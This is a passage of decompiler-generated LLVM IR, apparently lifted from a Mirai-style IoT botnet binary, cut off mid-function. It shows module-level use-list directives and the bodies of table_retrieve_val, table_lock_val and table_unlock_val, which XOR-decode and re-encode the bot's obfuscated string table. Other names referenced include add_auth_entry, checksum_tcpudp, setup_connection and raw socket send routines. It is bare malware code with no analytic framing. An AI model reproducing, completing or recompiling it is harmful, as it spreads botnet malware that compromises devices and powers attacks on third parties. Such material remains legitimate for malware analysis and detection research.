  uselistorder i32* %r0.global-to-local, { 110, 109, 111, 112, 113, 115, 114, 116, 117, 118, 119, 121, 122, 120, 82, 81, 83, 85, 84, 86, 87, 88, 90, 89, 23, 25, 126, 123, 1, 3, 2, 4, 124, 125, 0, 127, 91, 167, 59, 61, 60, 93, 92, 94, 96, 95, 97, 99, 98, 100, 26, 6, 5, 8, 7, 10, 9, 11, 62, 13, 12, 14, 16, 15, 18, 17, 19, 20, 21, 22, 28, 27, 30, 29, 196, 24, 32, 31, 33, 34, 35, 37, 36, 39, 38, 41, 40, 42, 44, 43, 45, 47, 46, 49, 48, 50, 51, 53, 52, 55, 54, 57, 56, 58, 64, 63, 65, 67, 66, 69, 68, 71, 70, 72, 73, 75, 74, 77, 76, 79, 78, 80, 102, 104, 103, 105, 101, 106, 107, 180, 165, 170, 168, 169, 175, 171, 172, 166, 173, 174, 176, 178, 177, 179, 181, 186, 182, 185, 183, 184, 189, 187, 188, 192, 190, 191, 194, 193, 108, 164, 195, 128, 129, 131, 130, 133, 132, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 153, 152, 154, 159, 155, 156, 157, 158, 160, 161, 162, 163 }
  uselistorder i32* %ip.global-to-local, { 3, 4, 5, 0, 12, 15, 13, 14, 16, 1, 17, 18, 19, 20, 21, 22, 23, 2, 6, 7, 8, 9, 10, 11 }
  uselistorder i1* %cpsr_z.global-to-local, { 108, 109, 197, 180, 182, 1, 158, 160, 125, 126, 110, 124, 112, 114, 115, 65, 66, 67, 68, 69, 0, 111, 2, 3, 4, 10, 5, 6, 7, 8, 9, 11, 12, 13, 14, 15, 16, 113, 17, 18, 23, 19, 20, 21, 22, 24, 25, 26, 27, 28, 32, 33, 34, 29, 30, 31, 35, 36, 37, 38, 39, 40, 44, 45, 46, 41, 42, 43, 47, 48, 49, 50, 51, 52, 56, 57, 58, 53, 54, 55, 59, 60, 61, 62, 63, 64, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 184, 87, 88, 89, 84, 85, 86, 90, 91, 92, 93, 94, 95, 99, 100, 101, 96, 97, 98, 102, 103, 104, 105, 106, 107, 116, 117, 118, 119, 183, 185, 186, 187, 189, 190, 191, 193, 194, 195, 196, 188, 192, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 210, 212, 213, 211, 208, 209, 149, 144, 137, 214, 140, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 138, 139, 141, 123, 142, 143, 122, 145, 146, 121, 147, 148, 150, 151, 152, 153, 120, 154, 155, 156, 157, 159, 181, 161, 162, 163, 179, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 164, 178 }
  uselistorder i1* %cpsr_c.global-to-local, { 105, 106, 194, 116, 180, 1, 122, 149, 151, 123, 107, 121, 108, 110, 111, 65, 66, 67, 68, 0, 120, 2, 3, 4, 10, 5, 6, 7, 8, 9, 11, 12, 13, 14, 15, 16, 109, 17, 18, 23, 19, 20, 21, 22, 24, 25, 26, 27, 28, 32, 33, 34, 29, 30, 31, 35, 36, 37, 38, 39, 40, 44, 45, 46, 41, 42, 43, 47, 48, 49, 50, 51, 52, 56, 57, 58, 53, 54, 55, 59, 60, 61, 62, 63, 64, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 115, 84, 85, 86, 81, 82, 83, 87, 88, 89, 90, 91, 92, 96, 97, 98, 93, 94, 95, 99, 100, 101, 102, 103, 104, 112, 113, 114, 181, 183, 184, 185, 187, 188, 189, 190, 191, 192, 193, 182, 186, 195, 196, 197, 198, 199, 200, 201, 202, 205, 207, 208, 206, 203, 204, 143, 139, 128, 209, 129, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 124, 125, 126, 127, 130, 131, 132, 133, 134, 135, 136, 137, 138, 119, 140, 141, 118, 142, 144, 117, 145, 146, 147, 148, 150, 152, 179, 153, 154, 155, 156, 157, 178, 158, 160, 161, 177, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 159, 176 }
  uselistorder i32 (i32)* @inet_addr, { 3, 2, 1, 0 }
  uselistorder i32 ptrtoint ([15 x i8]* @global_var_1926c.91 to i32), { 0, 2, 1, 3 }
  uselistorder i16** @global_var_21c50.145, { 1, 0 }
  uselistorder i16* bitcast (i16** @global_var_21c50.145 to i16*), { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @getsockopt, { 1, 0 }
  uselistorder i8 31, { 6, 0, 1, 2, 3, 7, 8, 4, 5 }
  uselistorder i32 251, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder i8 -3, { 3, 4, 1, 5, 2, 6, 0 }
  uselistorder i8 -4, { 3, 4, 1, 5, 2, 6, 0 }
  uselistorder i32 ptrtoint ([3 x i8]* @global_var_19310.205 to i32), { 5, 7, 6, 8, 2, 9, 0, 10, 1, 11, 3, 12, 4, 13 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_send, { 14, 13, 12, 11, 10, 9, 8, 20, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 19, 18, 17, 16, 15, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8 37, { 0, 1, 6, 7, 2, 3, 4, 5, 8, 9, 10, 11 }
  uselistorder i8 34, { 0, 1, 2, 3, 8, 9, 4, 5, 6, 7, 10, 11, 12, 13 }
  uselistorder i8 36, { 0, 1, 2, 3, 4, 5, 14, 15, 16, 17, 6, 7, 8, 9, 10, 11, 12, 13, 18, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i8 35, { 0, 1, 2, 3, 4, 5, 6, 7, 16, 17, 18, 19, 8, 9, 10, 11, 12, 13, 14, 15, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder i8 58, { 0, 1, 2, 3, 8, 9, 4, 5, 6, 7, 10, 11, 12, 13, 14, 15 }
  uselistorder i8 57, { 0, 1, 2, 3, 8, 9, 4, 5, 6, 7, 10, 11, 12, 13 }
  uselistorder i8 62, { 0, 1, 2, 3, 8, 9, 4, 5, 6, 7, 10, 11, 12, 13 }
  uselistorder i8 61, { 0, 1, 2, 3, 8, 9, 4, 5, 6, 7, 10, 11, 12, 13 }
  uselistorder i32 (i32)* @table_lock_val, { 28, 41, 40, 27, 34, 39, 38, 37, 36, 35, 33, 32, 31, 30, 29, 26, 2, 24, 23, 22, 25, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @util_memsearch, { 1, 4, 3, 2, 0 }
  uselistorder i32 (i32, i32*)* @table_retrieve_val, { 8, 9, 0, 1, 2, 3, 4, 5, 6, 7, 10, 34, 12, 13, 14, 11, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 35, 36, 37 }
  uselistorder i32 (i32)* @table_unlock_val, { 23, 22, 31, 30, 29, 28, 27, 26, 25, 24, 21, 3, 19, 18, 17, 20, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_recv, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 284, { 3, 0, 1, 2, 4, 5, 6, 7, 8 }
  uselistorder i32 ()* @setup_connection, { 2, 1, 0 }
  uselistorder i32 254, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder i8 2, { 0, 2, 1 }
  uselistorder i8 5, { 11, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 39, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_recvfrom, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_sendto, { 2, 9, 8, 7, 6, 5, 4, 3, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @checksum_tcpudp, { 2, 9, 8, 7, 6, 5, 4, 3, 1, 0 }
  uselistorder i32 4873, { 1, 0 }
  uselistorder i32* @global_var_21c3c.200, { 1, 0 }
  uselistorder i16* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_21c38.158 to i32), i32 2) to i16*), { 1, 0 }
  uselistorder i32 (i32, i32)* @checksum_generic, { 4, 11, 10, 9, 8, 7, 6, 5, 3, 2, 1, 0 }
  uselistorder i16* bitcast (i32* @global_var_21c2e.197 to i16*), { 1, 0, 2 }
  uselistorder i32 16711680, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32 (i32)* @llvm.bswap.i32, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 17, 18, 15, 16, 21, 22, 19, 20, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i32 214, { 1, 0 }
  uselistorder i32 184, { 1, 0 }
  uselistorder i32 185, { 1, 0 }
  uselistorder i32 223, { 4, 0, 1, 2, 3 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_192f0.191 to i32), { 0, 4, 1, 2, 3, 5 }
  uselistorder i32 ptrtoint ([6 x i8]* @global_var_192e8.189 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_192ac.177 to i32), { 0, 4, 1, 5, 2, 6, 3, 7 }
  uselistorder i32 (i32, i32, i32)* @add_auth_entry, { 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_19288.169 to i32), { 0, 8, 1, 9, 2, 10, 3, 11, 4, 12, 5, 13, 6, 14, 7, 15 }
  uselistorder i32 ptrtoint (i32* @global_var_1928c.167 to i32), { 1, 2, 0, 3 }
  uselistorder i8* @global_var_21c45.164, { 1, 0 }
  uselistorder i16* @global_var_21c3a.163, { 1, 0 }
  uselistorder i16 5888, { 1, 0, 2, 3 }
  uselistorder i32 5888, { 2, 0, 3, 1 }
  uselistorder i8 6, { 2, 3, 4, 0, 1 }
  uselistorder i8 16, { 13, 0, 1, 2, 14, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i16* @global_var_21c38.158, { 0, 2, 1 }
  uselistorder i32 ptrtoint (i16* @global_var_21c38.158 to i32), { 5, 2, 1, 0, 4, 3 }
  uselistorder i8* @global_var_21c44.159, { 1, 0 }
  uselistorder i32 10240, { 1, 0, 2 }
  uselistorder i8** @global_var_21c24.155, { 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_21c24.155 to i32), { 2, 10, 3, 1, 0, 9, 4, 8, 7, 6, 5 }
  uselistorder i32 1023, { 2, 0, 1 }
  uselistorder i32 ()* @rand_next, { 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 0, 28, 27, 26, 25, 24, 23, 22, 21, 3, 2, 1, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__GI_setsockopt, { 10, 9, 8, 7, 6, 5, 0, 4, 3, 2, 1 }
  uselistorder i32* @global_var_2473c.153, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32* @global_var_24738.151, { 2, 3, 4, 0, 1, 5 }
  uselistorder i32 288, { 0, 1, 6, 2, 3, 4, 5, 7 }
  uselistorder i32* @global_var_21c54.139, { 2, 0, 3, 4, 1, 6, 5 }
  uselistorder i32 (i32*)* @__GI_time, { 8, 0, 1, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 (i32)* @rand_init, { 1, 0 }
  uselistorder i32* @global_var_2471c.58, { 3, 4, 1, 2, 0, 5, 6, 7, 8, 9, 10, 11, 14, 12, 13 }
  uselistorder i32 ptrtoint (i32* @global_var_2471c.58 to i32), { 1, 2, 3, 4, 0, 5, 6, 7 }
  uselistorder i32 ()* @util_local_addr, { 2, 1, 0 }
  uselistorder i32 ()* @__libc_fork, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_fc3c, { 1, 0 }
  uselistorder label %dec_label_pc_fc34, { 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_fc28, { 1, 0 }
  uselistorder label %dec_label_pc_ef78.backedge, { 1, 2, 0 }
  uselistorder label %dec_label_pc_ef78.backedge.thread561, { 2, 0, 1, 3, 4 }
  uselistorder label %dec_label_pc_ef78.backedge.thread, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_fa18, { 1, 0 }
  uselistorder label %dec_label_pc_f978, { 1, 2, 3, 0, 4, 6, 7, 5 }
  uselistorder label %dec_label_pc_f940, { 1, 0 }
  uselistorder label %dec_label_pc_f92c, { 1, 2, 3, 4, 0, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_f91c, { 1, 0 }
  uselistorder label %dec_label_pc_f80c, { 1, 0 }
  uselistorder label %dec_label_pc_f78c, { 5, 3, 4, 2, 6, 1, 0 }
  uselistorder label %dec_label_pc_f758, { 1, 0 }
  uselistorder label %thread-pre-split124, { 1, 0 }
  uselistorder label %dec_label_pc_f708, { 1, 0 }
  uselistorder label %dec_label_pc_f64c, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_f634, { 1, 0 }
  uselistorder label %dec_label_pc_f500, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_f4e8, { 1, 0 }
  uselistorder label %dec_label_pc_f42c, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_f414, { 1, 0 }
  uselistorder label %dec_label_pc_f3a0, { 6, 2, 3, 4, 1, 0, 5 }
  uselistorder label %.thread103, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f36c, { 1, 0 }
  uselistorder label %.thread99, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f34c, { 1, 0 }
  uselistorder label %dec_label_pc_f338, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_f2f4, { 1, 0 }
  uselistorder label %dec_label_pc_f2f4.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_f288, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_f270, { 1, 0 }
  uselistorder label %dec_label_pc_f1b4, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_f19c, { 1, 0 }
  uselistorder label %dec_label_pc_f07c, { 1, 6, 7, 3, 0, 2, 4, 5 }
  uselistorder label %bb424, { 1, 0 }
  uselistorder label %bb422, { 1, 0 }
  uselistorder label %dec_label_pc_f044, { 1, 0 }
  uselistorder label %dec_label_pc_efdc, { 1, 0 }
  uselistorder label %.thread82, { 1, 0 }
  uselistorder label %dec_label_pc_ef90, { 1, 0 }
  uselistorder label %dec_label_pc_ef80, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_ef80.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_ef5c, { 1, 0 }
  uselistorder label %bb418, { 1, 0 }
  uselistorder label %dec_label_pc_ee80, { 1, 0 }
  uselistorder label %bb416, { 1, 0 }
  uselistorder label %bb414, { 1, 0 }
  uselistorder label %bb412, { 1, 0 }
  uselistorder label %bb410, { 3, 4, 0, 1, 2, 6, 5 }
  uselistorder label %dec_label_pc_ed74.dec_label_pc_ed74_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_ed50.dec_label_pc_ed50_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_ed44, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_ed2c, { 1, 0 }
  uselistorder label %dec_label_pc_ed08, { 1, 0 }
  uselistorder label %dec_label_pc_ebbc, { 10, 0, 1, 2, 7, 8, 3, 4, 5, 6, 9, 11 }
  uselistorder label %dec_label_pc_eba8, { 1, 0 }
  uselistorder label %bb407, { 1, 0 }
  uselistorder label %dec_label_pc_ea3c, { 1, 0 }
  uselistorder label %dec_label_pc_ea30, { 1, 0 }
  uselistorder label %dec_label_pc_ea24, { 1, 0 }
  uselistorder label %dec_label_pc_ea18, { 1, 0 }
  uselistorder label %dec_label_pc_ea0c, { 1, 0 }
  uselistorder label %dec_label_pc_e9f8, { 1, 0 }
  uselistorder label %dec_label_pc_e9e4, { 1, 0 }
  uselistorder label %dec_label_pc_e9d0, { 1, 0 }
  uselistorder label %dec_label_pc_e9b0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_e98c, { 1, 0 }
  uselistorder label %dec_label_pc_e980, { 1, 2, 0 }
  uselistorder label %dec_label_pc_e95c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_e938, { 1, 0 }
  uselistorder label %bb374, { 1, 0 }
  uselistorder label %dec_label_pc_e8e4, { 30, 6, 27, 2, 28, 3, 29, 4, 10, 5, 11, 0, 12, 13, 14, 15, 7, 8, 9, 16, 17, 18, 19, 20, 21, 22, 23, 24, 1, 25, 26, 31 }
  uselistorder label %dec_label_pc_e6d4, { 1, 0 }
}

define i32 @table_retrieve_val(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_24748.215 to i32), i32* @r2, align 4
  %v3_fce4 = mul i32 %arg1, 8
  %v2_fce8 = add i32 %v3_fce4, ptrtoint (i32* @global_var_24748.215 to i32)
  store i32 %v2_fce8, i32* @r3, align 4
  %v2_fcec = icmp eq i32* %arg2, null
  br i1 %v2_fcec, label %.thread, label %bb

.thread:                                          ; preds = %entry
  %v3_fcf44 = inttoptr i32 %v2_fce8 to i32*
  %v4_fcf45 = load i32, i32* %v3_fcf44, align 4
  br label %bb7

bb:                                               ; preds = %entry
  %v2_fcf0 = add i32 %v3_fce4, add (i32 ptrtoint (i32* @global_var_24748.215 to i32), i32 4)
  %v3_fcf0 = inttoptr i32 %v2_fcf0 to i16*
  %v4_fcf0 = load i16, i16* %v3_fcf0, align 4
  %v5_fcf0 = zext i16 %v4_fcf0 to i32
  store i32 %v5_fcf0, i32* @r3, align 4
  %v3_fcf4 = inttoptr i32 %v2_fce8 to i32*
  %v4_fcf4 = load i32, i32* %v3_fcf4, align 4
  store i32 %v5_fcf0, i32* %arg2, align 4
  br label %bb7

bb7:                                              ; preds = %.thread, %bb
  %v4_fcf46 = phi i32 [ %v4_fcf45, %.thread ], [ %v4_fcf4, %bb ]
  ret i32 %v4_fcf46

; uselistorder directives
  uselistorder i32 %v2_fce8, { 1, 0, 2 }
  uselistorder i32 %v3_fce4, { 1, 0 }
  uselistorder label %bb7, { 1, 0 }
}

define i32 @table_lock_val(i32 %arg1) local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_fd0c = mul i32 %arg1, 8
  %v2_fd10 = add i32 %v3_fd0c, ptrtoint (i32* @global_var_24748.215 to i32)
  %v2_fd14 = load i32, i32* @global_var_21a98.218, align 4
  store i32 %v2_fd14, i32* @r1, align 4
  %v1_fd18 = add i32 %v3_fd0c, add (i32 ptrtoint (i32* @global_var_24748.215 to i32), i32 4)
  %v2_fd18 = inttoptr i32 %v1_fd18 to i16*
  %v3_fd18 = load i16, i16* %v2_fd18, align 4
  %v3_fd1c = udiv i32 %v2_fd14, 256
  %v2_fd20 = icmp eq i16 %v3_fd18, 0
  %v3_fd24 = udiv i32 %v2_fd14, 65536
  store i32 %v3_fd24, i32* @r3, align 4
  %v3_fd28 = load i32, i32* @r4, align 4
  store i32 %v3_fd28, i32* %stack_var_-16, align 4
  %v1_fd2c = urem i32 %v3_fd1c, 256
  store i32 %v1_fd2c, i32* %r6.global-to-local, align 4
  %v1_fd30 = urem i32 %v3_fd24, 256
  store i32 %v1_fd30, i32* %r5.global-to-local, align 4
  %v3_fd34 = udiv i32 %v2_fd14, 16777216
  store i32 %v3_fd34, i32* %r4.global-to-local, align 4
  %v1_fd38 = urem i32 %v2_fd14, 256
  store i32 %v1_fd38, i32* %lr.global-to-local, align 4
  br i1 %v2_fd20, label %dec_label_pc_fd94, label %dec_label_pc_fd40

dec_label_pc_fd40:                                ; preds = %entry
  store i32 0, i32* @ip, align 4
  %v1_fd44 = inttoptr i32 %v2_fd10 to i32*
  br label %dec_label_pc_fd44

dec_label_pc_fd44:                                ; preds = %dec_label_pc_fd44.dec_label_pc_fd44_crit_edge, %dec_label_pc_fd40
  %v0_fd4c = phi i32 [ %v0_fd4c.pre, %dec_label_pc_fd44.dec_label_pc_fd44_crit_edge ], [ %v1_fd38, %dec_label_pc_fd40 ]
  %v2_fd50 = phi i32 [ %v1_fd88, %dec_label_pc_fd44.dec_label_pc_fd44_crit_edge ], [ 0, %dec_label_pc_fd40 ]
  %v2_fd44 = load i32, i32* %v1_fd44, align 4
  %v2_fd48 = add i32 %v2_fd44, %v2_fd50
  %v3_fd48 = inttoptr i32 %v2_fd48 to i8*
  %v4_fd48 = load i8, i8* %v3_fd48, align 1
  %v6_fd48 = zext i8 %v4_fd48 to i32
  %v2_fd4c = xor i32 %v6_fd48, %v0_fd4c
  %v1_fd50 = trunc i32 %v2_fd4c to i8
  store i8 %v1_fd50, i8* %v3_fd48, align 1
  %v2_fd54 = load i32, i32* %v1_fd44, align 4
  %v0_fd58 = load i32, i32* @ip, align 4
  %v2_fd58 = add i32 %v0_fd58, %v2_fd54
  %v3_fd58 = inttoptr i32 %v2_fd58 to i8*
  %v4_fd58 = load i8, i8* %v3_fd58, align 1
  %v6_fd58 = zext i8 %v4_fd58 to i32
  %v0_fd5c = load i32, i32* %r6.global-to-local, align 4
  %v2_fd5c = xor i32 %v0_fd5c, %v6_fd58
  %v1_fd60 = trunc i32 %v2_fd5c to i8
  store i8 %v1_fd60, i8* %v3_fd58, align 1
  %v2_fd64 = load i32, i32* %v1_fd44, align 4
  %v0_fd68 = load i32, i32* @ip, align 4
  %v2_fd68 = add i32 %v0_fd68, %v2_fd64
  %v3_fd68 = inttoptr i32 %v2_fd68 to i8*
  %v4_fd68 = load i8, i8* %v3_fd68, align 1
  %v6_fd68 = zext i8 %v4_fd68 to i32
  %v0_fd6c = load i32, i32* %r5.global-to-local, align 4
  %v2_fd6c = xor i32 %v0_fd6c, %v6_fd68
  %v1_fd70 = trunc i32 %v2_fd6c to i8
  store i8 %v1_fd70, i8* %v3_fd68, align 1
  %v2_fd74 = load i32, i32* %v1_fd44, align 4
  store i32 %v2_fd74, i32* @r1, align 4
  %v0_fd78 = load i32, i32* @ip, align 4
  %v2_fd78 = add i32 %v0_fd78, %v2_fd74
  %v3_fd78 = inttoptr i32 %v2_fd78 to i8*
  %v4_fd78 = load i8, i8* %v3_fd78, align 1
  %v6_fd78 = zext i8 %v4_fd78 to i32
  %v0_fd7c = load i32, i32* %r4.global-to-local, align 4
  %v2_fd7c = xor i32 %v0_fd7c, %v6_fd78
  store i32 %v2_fd7c, i32* @r3, align 4
  %v1_fd80 = trunc i32 %v2_fd7c to i8
  store i8 %v1_fd80, i8* %v3_fd78, align 1
  %v3_fd84 = load i16, i16* %v2_fd18, align 4
  %v4_fd84 = zext i16 %v3_fd84 to i32
  %v0_fd88 = load i32, i32* @ip, align 4
  %v1_fd88 = add i32 %v0_fd88, 1
  store i32 %v1_fd88, i32* @ip, align 4
  %v8_fd90 = icmp sgt i32 %v4_fd84, %v1_fd88
  br i1 %v8_fd90, label %dec_label_pc_fd44.dec_label_pc_fd44_crit_edge, label %dec_label_pc_fd94.loopexit

dec_label_pc_fd44.dec_label_pc_fd44_crit_edge:    ; preds = %dec_label_pc_fd44
  %v0_fd4c.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_fd44

dec_label_pc_fd94.loopexit:                       ; preds = %dec_label_pc_fd44
  %v2_fd94.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_fd94

dec_label_pc_fd94:                                ; preds = %dec_label_pc_fd94.loopexit, %entry
  %v2_fd94 = phi i32 [ %v2_fd94.pre, %dec_label_pc_fd94.loopexit ], [ %v3_fd28, %entry ]
  store i32 %v2_fd94, i32* @r4, align 4
  ret i32 %v2_fd10

; uselistorder directives
  uselistorder i32 %v1_fd88, { 1, 2, 0 }
  uselistorder i32 %v1_fd38, { 1, 0 }
  uselistorder i32 %v3_fd24, { 1, 0 }
  uselistorder i32 %v2_fd14, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v3_fd0c, { 1, 0 }
}

define i32 @table_unlock_val(i32 %arg1) local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_fdac = mul i32 %arg1, 8
  %v2_fdb0 = add i32 %v3_fdac, ptrtoint (i32* @global_var_24748.215 to i32)
  %v2_fdb4 = load i32, i32* @global_var_21a98.218, align 4
  %v1_fdb8 = add i32 %v3_fdac, add (i32 ptrtoint (i32* @global_var_24748.215 to i32), i32 4)
  %v2_fdb8 = inttoptr i32 %v1_fdb8 to i16*
  %v3_fdb8 = load i16, i16* %v2_fdb8, align 4
  %v3_fdbc = udiv i32 %v2_fdb4, 256
  %v2_fdc0 = icmp eq i16 %v3_fdb8, 0
  %v3_fdc4 = udiv i32 %v2_fdb4, 65536
  %v3_fdc8 = load i32, i32* @r4, align 4
  store i32 %v3_fdc8, i32* %stack_var_-16, align 4
  %v1_fdcc = urem i32 %v3_fdbc, 256
  store i32 %v1_fdcc, i32* %r6.global-to-local, align 4
  %v1_fdd0 = urem i32 %v3_fdc4, 256
  store i32 %v1_fdd0, i32* %r5.global-to-local, align 4
  %v3_fdd4 = udiv i32 %v2_fdb4, 16777216
  store i32 %v3_fdd4, i32* %r4.global-to-local, align 4
  %v1_fdd8 = urem i32 %v2_fdb4, 256
  store i32 %v1_fdd8, i32* %lr.global-to-local, align 4
  br i1 %v2_fdc0, label %dec_label_pc_fe34, label %dec_label_pc_fde0

dec_label_pc_fde0:                                ; preds = %entry
  store i32 0, i32* @ip, align 4
  %v1_fde4 = inttoptr i32 %v2_fdb0 to i32*
  br label %dec_label_pc_fde4

dec_label_pc_fde4:                                ; preds = %dec_label_pc_fde4.dec_label_pc_fde4_crit_edge, %dec_label_pc_fde0
  %v0_fdec = phi i32 [ %v0_fdec.pre, %dec_label_pc_fde4.dec_label_pc_fde4_crit_edge ], [ %v1_fdd8, %dec_label_pc_fde0 ]
  %v2_fdf0 = phi i32 [ %v1_fe28, %dec_label_pc_fde4.dec_label_pc_fde4_crit_edge ], [ 0, %dec_label_pc_fde0 ]
  %v2_fde4 = load i32, i32* %v1_fde4, align 4
  %v2_fde8 = add i32 %v2_fde4, %v2_fdf0
  %v3_fde8 = inttoptr i32 %v2_fde8 to i8*
  %v4_fde8 = load i8, i8* %v3_fde8, align 1
  %v6_fde8 = zext i8 %v4_fde8 to i32
  %v2_fdec = xor i32 %v6_fde8, %v0_fdec
  %v1_fdf0 = trunc i32 %v2_fdec to i8
  store i8 %v1_fdf0, i8* %v3_fde8, align 1
  %v2_fdf4 = load i32, i32* %v1_fde4, align 4
  %v0_fdf8 = load i32, i32* @ip, align 4
  %v2_fdf8 = add i32 %v0_fdf8, %v2_fdf4
  %v3_fdf8 = inttoptr i32 %v2_fdf8 to i8*
  %v4_fdf8 = load i8, i8* %v3_fdf8, align 1
  %v6_fdf8 = zext i8 %v4_fdf8 to i32
  %v0_fdfc = load i32, i32* %r6.global-to-local, align 4
  %v2_fdfc = xor i32 %v0_fdfc, %v6_fdf8
  %v1_fe00 = trunc i32 %v2_fdfc to i8
  store i8 %v1_fe00, i8* %v3_fdf8, align 1
  %v2_fe04 = load i32, i32* %v1_fde4, align 4
  %v0_fe08 = load i32, i32* @ip, align 4
  %v2_fe08 = add i32 %v0_fe08, %v2_fe04
  %v3_fe08 = inttoptr i32 %v2_fe08 to i8*
  %v4_fe08 = load i8, i8* %v3_fe08, align 1
  %v6_fe08 = zext i8 %v4_fe08 to i32
  %v0_fe0c = load i32, i32* %r5.global-to-local, align 4
  %v2_fe0c = xor i32 %v0_fe0c, %v6_fe08
  %v1_fe10 = trunc i32 %v2_fe0c to i8
  store i8 %v1_fe10, i8* %v3_fe08, align 1
  %v2_fe14 = load i32, i32* %v1_fde4, align 4
  %v0_fe18 = load i32, i32* @ip, align 4
  %v2_fe18 = add i32 %v0_fe18, %v2_fe14
  %v3_fe18 = inttoptr i32 %v2_fe18 to i8*
  %v4_fe18 = load i8, i8* %v3_fe18, align 1
  %v6_fe18 = zext i8 %v4_fe18 to i32
  %v0_fe1c = load i32, i32* %r4.global-to-local, align 4
  %v2_fe1c = xor i32 %v0_fe1c, %v6_fe18
  %v1_fe20 = trunc i32 %v2_fe1c to i8
  store i8 %v1_fe20, i8* %v3_fe18, align 1
  %v3_fe24 = load i16, i16* %v2_fdb8, align 4
  %v4_fe24 = zext i16 %v3_fe24 to i32
  %v0_fe28 = load i32, i32* @ip, align 4
  %v1_fe28 = add i32 %v0_fe28, 1
  store i32 %v1_fe28, i32* @ip, align 4
  %v8_fe30 = icmp sgt i32 %v4_fe24, %v1_fe28
